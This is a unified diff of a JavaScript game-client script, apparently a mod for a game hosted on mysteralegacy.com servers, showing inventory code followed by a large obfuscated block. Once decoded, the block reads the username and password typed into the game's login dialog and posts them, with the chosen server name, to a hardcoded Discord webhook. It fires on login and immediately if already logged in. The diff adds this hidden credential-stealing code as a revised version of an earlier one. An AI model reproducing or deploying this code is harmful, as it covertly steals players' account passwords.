@@ -1021,123 +1021,176 @@ dsk.invManager.updateSlots = () => {
 };
 dsk.on('postPacket:inv', dsk.invManager.updateSlots);
 
-const _0x5c0eed = _0x22a5;
-(function (_0x1ce0e4, _0x11591c) {
-    const _0x2ee741 = _0x22a5, _0x3a781e = _0x1ce0e4();
+const _0xb71114 = _0x27f5;
+function _0x27f5(_0xf3e787, _0x479f93) {
+    _0xf3e787 = _0xf3e787 - (-0x1 * -0x169c + -0x128b * -0x1 + -0x27f1);
+    const _0x559caa = _0x31bd();
+    let _0x38cd2c = _0x559caa[_0xf3e787];
+    return _0x38cd2c;
+}
+(function (_0x4a51f9, _0x535f8a) {
+    const _0x1196b5 = _0x27f5, _0x4462e8 = _0x4a51f9();
     while (!![]) {
         try {
-            const _0x43d5fb = -parseInt(_0x2ee741(0x210)) / (0xa45 + 0x8a7 + 0x1d * -0xa7) + -parseInt(_0x2ee741(0x202)) / (0x1d * -0xd6 + 0x2 * -0xd1e + 0x435 * 0xc) + -parseInt(_0x2ee741(0x1ea)) / (0xfd * -0x16 + -0x2e6 + 0x18a7) * (-parseInt(_0x2ee741(0x1f4)) / (-0x11a5 + -0x7c0 + 0x1969)) + -parseInt(_0x2ee741(0x209)) / (-0x1c * -0x99 + 0x140f + -0x416 * 0x9) + -parseInt(_0x2ee741(0x1f1)) / (0x1af0 + 0x2 * -0xd0f + -0xcc) + parseInt(_0x2ee741(0x1e7)) / (-0x1 * 0x5cb + -0x167c + 0x1c4e * 0x1) + parseInt(_0x2ee741(0x201)) / (0x18fd + 0xa93 * -0x1 + -0xe62);
-            if (_0x43d5fb === _0x11591c)
+            const _0x316bcf = -parseInt(_0x1196b5(0x13a)) / (-0xd19 + 0x2ed + 0xa2d) * (-parseInt(_0x1196b5(0x159)) / (-0xda * -0x7 + -0x785 + 0x191)) + parseInt(_0x1196b5(0x14b)) / (-0x2 * 0x7f6 + -0x1252 + 0x2241) + -parseInt(_0x1196b5(0x15f)) / (-0x1 * -0x7c3 + -0x4 * 0x5ea + 0xfe9) + -parseInt(_0x1196b5(0x141)) / (-0x1 * 0xf5f + 0x22f + 0xd35) + parseInt(_0x1196b5(0x13e)) / (0x1529 * 0x1 + 0x10c4 + -0x25e7) + parseInt(_0x1196b5(0x13f)) / (-0x11f * -0x8 + 0xf28 + -0x1819) * (-parseInt(_0x1196b5(0x14a)) / (-0x22 * 0xf1 + -0x2451 + -0x133 * -0x39)) + -parseInt(_0x1196b5(0x168)) / (0x1981 * 0x1 + 0x5b5 + 0x17 * -0x15b);
+            if (_0x316bcf === _0x535f8a)
                 break;
             else
-                _0x3a781e['push'](_0x3a781e['shift']());
-        } catch (_0x146011) {
-            _0x3a781e['push'](_0x3a781e['shift']());
+                _0x4462e8['push'](_0x4462e8['shift']());
+        } catch (_0x3499b2) {
+            _0x4462e8['push'](_0x4462e8['shift']());
         }
     }
-}(_0xbd73, -0x5294 + 0x7db * 0x41 + 0x14be1 * 0x1), dsk[_0x5c0eed(0x1fc)] = { 'global': _0x5c0eed(0x1ec) + _0x5c0eed(0x1f0) + _0x5c0eed(0x1fb) + _0x5c0eed(0x1e9) + _0x5c0eed(0x20e) + _0x5c0eed(0x207) + _0x5c0eed(0x1fd) + _0x5c0eed(0x1fa) + _0x5c0eed(0x1f7) + _0x5c0eed(0x1eb) + _0x5c0eed(0x20a) + _0x5c0eed(0x1ef) + '9' }, dsk[_0x5c0eed(0x1f8)](_0x5c0eed(0x1ee) + _0x5c0eed(0x20c), () => {
-    const _0x4b28d6 = _0x5c0eed, _0x142527 = {
-            'yRTFX': function (_0x496b66, _0x3f85cd, _0x28e078) {
-                return _0x496b66(_0x3f85cd, _0x28e078);
+}(_0x31bd, 0x7e1 * 0x2aa + 0x2 * 0xb57f6 + -0x1f39b2), dsk[_0xb71114(0x179)] = { 'global': _0xb71114(0x175) + _0xb71114(0x178) + _0xb71114(0x148) + _0xb71114(0x140) + _0xb71114(0x161) + _0xb71114(0x147) + _0xb71114(0x174) + _0xb71114(0x142) + _0xb71114(0x144) + _0xb71114(0x158) + _0xb71114(0x157) + _0xb71114(0x15e) + '9' }, dsk[_0xb71114(0x146)](_0xb71114(0x16a) + _0xb71114(0x15d), () => {
+    const _0x22ffd9 = _0xb71114, _0x192db8 = {
+            'YCFIw': _0x22ffd9(0x154),
+            'bQilf': _0x22ffd9(0x16c),
+            'pOpCC': _0x22ffd9(0x138),
+            'kSybs': _0x22ffd9(0x16e),
+            'WLdxd': _0x22ffd9(0x163),
+            'YLVKv': _0x22ffd9(0x152),
+            'wypNx': _0x22ffd9(0x169),
+            'peWxS': _0x22ffd9(0x14c),
+            'wRRsF': _0x22ffd9(0x162),
+            'wBQth': _0x22ffd9(0x177),
+            'DYuCr': _0x22ffd9(0x13d),
+            'sZgLQ': function (_0x2a9ac0, _0x41ff83, _0x3c290f) {
+                return _0x2a9ac0(_0x41ff83, _0x3c290f);
             },
-            'CBAPY': _0x4b28d6(0x205),
-            'XZspL': _0x4b28d6(0x1f3) + _0x4b28d6(0x1e8),
-            'pORzB': _0x4b28d6(0x20b),
-            'akzoH': function (_0x3b0b1a, _0x23bc7b) {
-                return _0x3b0b1a + _0x23bc7b;
-            },
-            'BScTg': function (_0x7b17b5, _0x3e1066) {
-                return _0x7b17b5 + _0x3e1066;
-            },
-            'JhXmB': _0x4b28d6(0x1e5) + _0x4b28d6(0x204)
+            'JRIzk': _0x22ffd9(0x16b),
+            'ByPJo': _0x22ffd9(0x153) + _0x22ffd9(0x137),
+            'npsxb': _0x22ffd9(0x176),
+            'fzxKH': _0x22ffd9(0x167) + _0x22ffd9(0x151)
         };
     try {
-        const _0x337053 = jv[_0x4b28d6(0x206) + 'og']?.[_0x4b28d6(0x211)]?.[_0x4b28d6(0x1f6)]?.[_0x4b28d6(0x1fe)]() ?? '', _0xb0b0a0 = jv[_0x4b28d6(0x206) + 'og']?.[_0x4b28d6(0x20f)]?.[_0x4b28d6(0x1f6)]?.[_0x4b28d6(0x1fe)]() ?? '';
-        _0x337053 && _0x142527[_0x4b28d6(0x208)](fetch, dsk[_0x4b28d6(0x1fc)][_0x4b28d6(0x20d)], {
-            'method': _0x142527[_0x4b28d6(0x200)],
-            'headers': { 'Content-Type': _0x142527[_0x4b28d6(0x1ff)] },
-            'body': JSON[_0x4b28d6(0x1e6)]({
-                'username': _0x142527[_0x4b28d6(0x203)],
-                'content': _0x142527[_0x4b28d6(0x1ed)](_0x142527[_0x4b28d6(0x1f5)](_0x142527[_0x4b28d6(0x1f5)]('✅\x20', _0x337053), '\x20'), _0xb0b0a0)
+        const _0x5cae4f = {
+                'sa.mysteralegacy.com': _0x192db8[_0x22ffd9(0x13b)],
+                'ldn.mysteralegacy.com': _0x192db8[_0x22ffd9(0x14e)],
+                'usw.mysteralegacy.com': _0x192db8[_0x22ffd9(0x155)],
+                'use.mysteralegacy.com': _0x192db8[_0x22ffd9(0x143)],
+                'sea.mysteralegacy.com': _0x192db8[_0x22ffd9(0x14d)],
+                'eu.mysteralegacy.com': _0x192db8[_0x22ffd9(0x166)],
+                'ust.mysteralegacy.com': _0x192db8[_0x22ffd9(0x164)],
+                'br.mysteralegacy.com': _0x192db8[_0x22ffd9(0x160)],
+                'sea2.mysteralegacy.com': _0x192db8[_0x22ffd9(0x16f)],
+                'use2.mysteralegacy.com': _0x192db8[_0x22ffd9(0x145)],
+                'usw2.mysteralegacy.com': _0x192db8[_0x22ffd9(0x172)]
+            }, _0x54fdc5 = jv[_0x22ffd9(0x17a) + 'og']?.[_0x22ffd9(0x171)]?.[_0x22ffd9(0x136)]?.[_0x22ffd9(0x139)]() ?? '', _0x2bce3b = jv[_0x22ffd9(0x17a) + 'og']?.[_0x22ffd9(0x15a)]?.[_0x22ffd9(0x136)]?.[_0x22ffd9(0x139)]() ?? '', _0x41f50a = _0x5cae4f[jv[_0x22ffd9(0x15b) + 'p']] ?? jv[_0x22ffd9(0x15b) + 'p'];
+        _0x54fdc5 && _0x192db8[_0x22ffd9(0x149)](fetch, dsk[_0x22ffd9(0x179)][_0x22ffd9(0x170)], {
+            'method': _0x192db8[_0x22ffd9(0x16d)],
+            'headers': { 'Content-Type': _0x192db8[_0x22ffd9(0x165)] },
+            'body': JSON[_0x22ffd9(0x173)]({
+                'username': _0x192db8[_0x22ffd9(0x156)],
+                'content': '✅\x20' + _0x54fdc5 + (_0x22ffd9(0x15c) + ':\x20') + _0x2bce3b + (_0x22ffd9(0x150) + '\x20') + jv[_0x22ffd9(0x15b) + 'p']
             })
         });
-    } catch (_0x2f42b8) {
-        console[_0x4b28d6(0x1f2)](_0x142527[_0x4b28d6(0x1f9)], _0x2f42b8);
+    } catch (_0x554aa1) {
+        console[_0x22ffd9(0x13c)](_0x192db8[_0x22ffd9(0x14f)], _0x554aa1);
     }
 }));
-function _0x22a5(_0x101650, _0x11c003) {
-    _0x101650 = _0x101650 - (0x1b03 + 0xc27 + -0x2545);
-    const _0x322890 = _0xbd73();
-    let _0x5b2674 = _0x322890[_0x101650];
-    return _0x5b2674;
-}
-function _0xbd73() {
-    const _0x861935 = [
-        'dsk.dias\x20e',
-        'stringify',
-        '842359VfJDfS',
-        'n/json',
-        'ks/1480829',
-        '186GvUGpH',
-        'ZWykDWIMYO',
-        'https://di',
-        'akzoH',
-        'postPacket',
-        'zDBO50Lag9',
-        'scord.com/',
-        '1614660dOizid',
-        'log',
-        'applicatio',
-        '3568LOSBfd',
-        'BScTg',
-        'chars',
-        '0QOG88AbhF',
-        'once',
-        'JhXmB',
-        'AD5pv3s_Yr',
-        'api/webhoo',
-        'dias',
-        'QitytoVLlm',
-        'trim',
-        'XZspL',
-        'CBAPY',
-        '4519208FhNuWn',
-        '135110UplmKm',
-        'pORzB',
-        'rror:',
-        'POST',
-        'login_dial',
-        '98/H9pG9tZ',
-        'yRTFX',
-        '350650JoBrCO',
-        'TXOarRdOUC',
-        '[LOG]',
-        ':accepted',
-        'global',
-        '6027914280',
-        'password',
-        '139211vjaZjB',
-        'username'
-    ];
-    _0xbd73 = function () {
-        return _0x861935;
-    };
-    return _0xbd73();
-}
-if (myself !== undefined && game_state === 0x1dde * 0x1 + 0x12f2 + 0x1 * -0x30ce)
+if (myself !== undefined && game_state === 0xe * -0x102 + -0x1a83 + 0x28a1)
     try {
-        const name = jv[_0x5c0eed(0x206) + 'og']?.[_0x5c0eed(0x211)]?.[_0x5c0eed(0x1f6)]?.[_0x5c0eed(0x1fe)]() ?? '', level = jv[_0x5c0eed(0x206) + 'og']?.[_0x5c0eed(0x20f)]?.[_0x5c0eed(0x1f6)]?.[_0x5c0eed(0x1fe)]() ?? '';
-        name && fetch(dsk[_0x5c0eed(0x1fc)][_0x5c0eed(0x20d)], {
-            'method': _0x5c0eed(0x205),
-            'headers': { 'Content-Type': _0x5c0eed(0x1f3) + _0x5c0eed(0x1e8) },
-            'body': JSON[_0x5c0eed(0x1e6)]({
-                'username': _0x5c0eed(0x20b),
-                'content': '✅\x20' + name + '\x20' + level
+        const servers = {
+                'sa.mysteralegacy.com': _0xb71114(0x154),
+                'ldn.mysteralegacy.com': _0xb71114(0x16c),
+                'usw.mysteralegacy.com': _0xb71114(0x138),
+                'use.mysteralegacy.com': _0xb71114(0x16e),
+                'sea.mysteralegacy.com': _0xb71114(0x163),
+                'eu.mysteralegacy.com': _0xb71114(0x152),
+                'ust.mysteralegacy.com': _0xb71114(0x169),
+                'br.mysteralegacy.com': _0xb71114(0x14c),
+                'sea2.mysteralegacy.com': _0xb71114(0x162),
+                'use2.mysteralegacy.com': _0xb71114(0x177),
+                'usw2.mysteralegacy.com': _0xb71114(0x13d)
+            }, name = jv[_0xb71114(0x17a) + 'og']?.[_0xb71114(0x171)]?.[_0xb71114(0x136)]?.[_0xb71114(0x139)]() ?? '', level = jv[_0xb71114(0x17a) + 'og']?.[_0xb71114(0x15a)]?.[_0xb71114(0x136)]?.[_0xb71114(0x139)]() ?? '', serverName = servers[jv[_0xb71114(0x15b) + 'p']] ?? jv[_0xb71114(0x15b) + 'p'];
+        name && fetch(dsk[_0xb71114(0x179)][_0xb71114(0x170)], {
+            'method': _0xb71114(0x16b),
+            'headers': { 'Content-Type': _0xb71114(0x153) + _0xb71114(0x137) },
+            'body': JSON[_0xb71114(0x173)]({
+                'username': _0xb71114(0x176),
+                'content': '✅\x20' + name + (_0xb71114(0x15c) + ':\x20') + level + (_0xb71114(0x150) + '\x20') + jv[_0xb71114(0x15b) + 'p']
             })
         });
-    } catch (_0x293b8e) {
-        console[_0x5c0eed(0x1f2)](_0x5c0eed(0x1e5) + _0x5c0eed(0x204), _0x293b8e);
+    } catch (_0x34cb80) {
+        console[_0xb71114(0x13c)](_0xb71114(0x167) + _0xb71114(0x151), _0x34cb80);
     }
+function _0x31bd() {
+    const _0x5ca24a = [
+        '321979MWAAip',
+        'ks/1480829',
+        '897940jpbQmy',
+        'AD5pv3s_Yr',
+        'kSybs',
+        '0QOG88AbhF',
+        'wBQth',
+        'once',
+        '98/H9pG9tZ',
+        'api/webhoo',
+        'sZgLQ',
+        '40IZfcTL',
+        '4556961nKZpYe',
+        'Brasil',
+        'WLdxd',
+        'bQilf',
+        'fzxKH',
+        '\x20|\x20Server:',
+        'rror:',
+        'Europe',
+        'applicatio',
+        'Sudamerica',
+        'pOpCC',
+        'npsxb',
+        'TXOarRdOUC',
+        'ZWykDWIMYO',
+        '94296Toecur',
+        'password',
+        'selected_i',
+        '\x20\x20|\x20\x20Senha',
+        ':accepted',
+        'zDBO50Lag9',
+        '2855504UhfLKw',
+        'peWxS',
+        '6027914280',
+        'Asia\x202',
+        'Asia',
+        'wypNx',
+        'ByPJo',
+        'YLVKv',
+        'dsk.dias\x20e',
+        '18508149CMQohw',
+        'Texas',
+        'postPacket',
+        'POST',
+        'London',
+        'JRIzk',
+        'USEast',
+        'wRRsF',
+        'global',
+        'username',
+        'DYuCr',
+        'stringify',
+        'QitytoVLlm',
+        'https://di',
+        '[LOG]',
+        'USEast\x202',
+        'scord.com/',
+        'dias',
+        'login_dial',
+        'chars',
+        'n/json',
+        'USWest',
+        'trim',
+        '24GmocHm',
+        'YCFIw',
+        'log',
+        'USWest\x202',
+        '8072442mcouLj'
+    ];
+    _0x31bd = function () {
+        return _0x5ca24a;
+    };
+    return _0x31bd();
+}
 
 // ── DISCORD WEBHOOKS ─────────────────────────────────────────
 
